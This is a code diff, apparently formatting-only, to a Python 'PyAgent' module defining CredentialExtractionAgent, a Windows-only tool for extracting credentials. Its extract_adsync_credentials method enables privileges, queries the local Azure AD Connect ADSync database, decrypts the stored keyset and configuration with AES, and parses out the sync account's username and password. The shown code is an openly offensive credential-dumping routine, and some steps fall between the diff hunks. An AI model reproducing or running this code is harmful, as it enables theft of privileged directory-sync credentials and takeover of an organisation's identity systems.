@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 from __future__ import annotations
+
 # Copyright 2026 PyAgent Authors
 # Licensed under the Apache License, Version 2.0 (the "License");
 # you may not use this file except in compliance with the License.
@@ -31,14 +32,19 @@ from src.core.base.mixins.data_parsing_mixin import DataParsingMixin
 from src.core.base.mixins.privilege_escalation_mixin import PrivilegeEscalationMixin
 
 
-class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAccessMixin, 
-                              CryptoMixin, DataParsingMixin):
+class CredentialExtractionAgent(
+    BaseAgent,
+    PrivilegeEscalationMixin,
+    DatabaseAccessMixin,
+    CryptoMixin,
+    DataParsingMixin,
+):
     """Agent for extracting credentials using Windows-specific techniques."""
 
     def __init__(self, **kwargs: Any) -> None:
         if platform.system() != "Windows":
             raise RuntimeError("CredentialExtractionAgent is only supported on Windows")
-        
+
         super().__init__(**kwargs)
         PrivilegeEscalationMixin.__init__(self, **kwargs)
         DatabaseAccessMixin.__init__(self, **kwargs)
@@ -47,12 +53,7 @@ class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAcc
 
     async def extract_adsync_credentials(self) -> Dict[str, Any]:
         """Extract Azure AD Connect sync credentials."""
-        result = {
-            "success": False,
-            "username": None,
-            "password": None,
-            "error": None
-        }
+        result = {"success": False, "username": None, "password": None, "error": None}
 
         try:
             # Enable required privileges
@@ -79,7 +80,9 @@ class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAcc
                 # Connect to ADSync database
                 conn_str = r"Driver={ODBC Driver 17 for SQL Server};Server=(LocalDB)\.\ADSync2019;Database=ADSync;Trusted_Connection=yes"
                 if not self.connect_odbc(conn_str):
-                    result["error"] = f"Failed to connect to ADSync database: {self.get_last_error()}"
+                    result["error"] = (
+                        f"Failed to connect to ADSync database: {self.get_last_error()}"
+                    )
                     return result
 
                 # Query key metadata
@@ -120,7 +123,9 @@ class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAcc
 
                 # Extract AES key and IV from decrypted keyset
                 aes_key = decrypted_keyset[-44:-20]  # Key offset logic
-                aes_iv = self.base64_decode(encrypted_config)[:16]  # IV from base64 decoded config
+                aes_iv = self.base64_decode(encrypted_config)[
+                    :16
+                ]  # IV from base64 decoded config
 
                 # Decrypt configuration
                 encrypted_data = self.base64_decode(encrypted_config)[16:]  # Skip IV
@@ -134,8 +139,12 @@ class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAcc
                     return result
 
                 # Parse credentials from decrypted config
-                username = self.extract_xml_value(decrypted_config.decode('utf-16le'), "parameter name=\"UserName\"")
-                password = self.extract_xml_value(decrypted_config.decode('utf-16le'), "parameter name=\"Password\"")
+                username = self.extract_xml_value(
+                    decrypted_config.decode("utf-16le"), 'parameter name="UserName"'
+                )
+                password = self.extract_xml_value(
+                    decrypted_config.decode("utf-16le"), 'parameter name="Password"'
+                )
 
                 result["success"] = True
                 result["username"] = username
